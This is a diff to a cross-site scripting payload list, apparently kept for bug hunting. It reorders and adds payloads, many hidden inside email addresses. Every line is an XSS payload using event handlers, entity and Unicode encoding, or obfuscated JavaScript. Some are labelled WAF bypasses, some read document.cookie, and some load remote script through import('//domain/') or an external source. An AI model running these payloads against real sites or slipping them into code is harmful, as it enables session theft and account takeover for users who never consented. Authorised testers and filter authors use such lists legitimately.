@@ -12,10 +12,8 @@ orwa%27\"><svg/onload​=alert(document.cookie)>
 <sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
 <Svg On Only=1 Onload=alert(1337)>
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
-ab@gmail.com'\"><svg/onload=alert(/xss/)>
 %3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
 <Svg Only=1 OnLoad=confirm(document.domain)>
-<Svg/OnLoad=alert(1337)>"@gmail.com
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 <svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
@@ -42,13 +40,20 @@ ab@gmail.com'\"><svg/onload=alert(/xss/)>
 <xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 -->'"/><​/sCript><svG x=">" onload​=(co\u006efirm)``>
 <svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
-"onclick​=prompt(8)><svg/onload​=prompt(8)>"@x.y.
 /svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload​="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>
 "><svg/onload​=setTimeout`${'ale'+'rt'}(1)`>
 /<jxahmad282>=()?><svg/onload​=\u0063onfirm('hackedbyhunter')>
 %3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
 <svg+onload%3Dalert%26%230000000040+"1")> –
+ab@gmail.com'\"><svg/onload=alert(/xss/)>
+"onclick​=prompt(8)><svg/onload​=prompt(8)>"@x.y.
+<Svg/OnLoad=alert(1337)>"@gmail.com
+"><img/src/onerror=import('//domain/')>"@gmail.com
+<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
+-->"/><img src=@ onerror=prompt(document.cookie)>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
@@ -74,7 +79,6 @@ http://example.com/services"><script>alert(1)</script>/services/
 KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
 ><script%20>alert(document.domain)<%2fscript>
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
-"><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
 <Img Src=//X55.is OnLoad%0C=import(Src)>
 %3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
@@ -102,8 +106,6 @@ b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=Str
 <div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
 <div onpointerover="javascript:alert(document.domain)" style="width:100%;height:100vh;"></div>
 jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
-<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 "'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
 <math><x xlink:href=javascript:confirm`1`>click
 <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
@@ -157,7 +159,6 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <="" script=""><script> alert("Hacked By h6nt3r");</script>
 ">'><details/open/ontoggle​=confirm('XSS')>
 incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
-<bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
 ]});</script><script>prompt();</script><!--
 '-alert?.(1)-'
 <​/script><​script>alert(1234)<​/script>
@@ -173,7 +174,6 @@ Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x
 javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 <<iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert(document.cookie)"';>
--->"/><img src=@ onerror=prompt(document.cookie)>
 "><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
 top[8680439..toString(30)](document.domain)
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
